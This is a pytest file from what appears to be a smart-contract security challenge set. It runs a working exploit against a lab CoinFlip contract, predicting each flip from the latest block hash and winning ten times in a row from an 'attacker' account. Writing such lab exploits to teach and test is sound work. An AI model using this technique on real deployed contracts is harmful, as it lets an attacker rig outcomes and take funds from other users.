import os

import pytest

from sc_test_utils import get_web3_instance, load_w3_contract

FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968
# FACTOR = 2 ** 255

@pytest.fixture(scope="module")
def setup_module():
    file_name = os.path.basename(__file__)
    print(f": Setting up the module {file_name}")
    current_dir = os.path.dirname(__file__)
    parent_dir = os.path.dirname(current_dir)
    challenge_dir = file_name[5:-3]  # ignore "test_" and ".py"
    challenge_dir = os.path.join(parent_dir, challenge_dir)

    w3 = get_web3_instance()
    vulnerable_contract = load_w3_contract(challenge_dir, version='0.8.0')
    yield w3, vulnerable_contract
    print(f"\nTearing down the module: {file_name}")


def guess(w3):
    block_hash = w3.eth.get_block('latest')['hash']  # block N - 1
    block_value = int(block_hash.hex(), 16)
    side = block_value // FACTOR
    print(f"Side: {side}, Guess: {side == 1}, Latest block number: {w3.eth.block_number}")
    return True if side == 1 else False


def test_exploit(setup_module):
    w3, vulnerable_contract = setup_module
    attacker = w3.eth.accounts[1]
    required_wins = 10
    wins = vulnerable_contract.functions.consecutiveWins().call({'from': attacker})
    assert 0 == wins
    print(f"Consecutive wins before exploit: {wins}")

    for i in range(1, required_wins + 1):
        # 1. Mine next block
        w3.provider.make_request("evm_mine", [])

        # 2. Get the block that was just mined (will be used by contract)
        # 3. Predict outcome from correct block hash
        _guess = guess(w3)
        print(f"Guessing: {_guess}")

        # mimic the behavior of the real contract CoinFlip before update
        # 4. Submit guess in current block
        tx = vulnerable_contract.functions.flip(_guess).transact({'from': attacker})
        receipt = w3.eth.wait_for_transaction_receipt(tx)
        # print(f"Transaction receipt: {minimal_tx(receipt)}")
        # 5. Check result
        assert i == vulnerable_contract.functions.consecutiveWins().call({'from': attacker})
        print(f"Flipped coin {i} times")

    wins = vulnerable_contract.functions.consecutiveWins().call({'from': attacker})
    assert required_wins == wins
    print(f"Consecutive wins after exploit: {wins}")
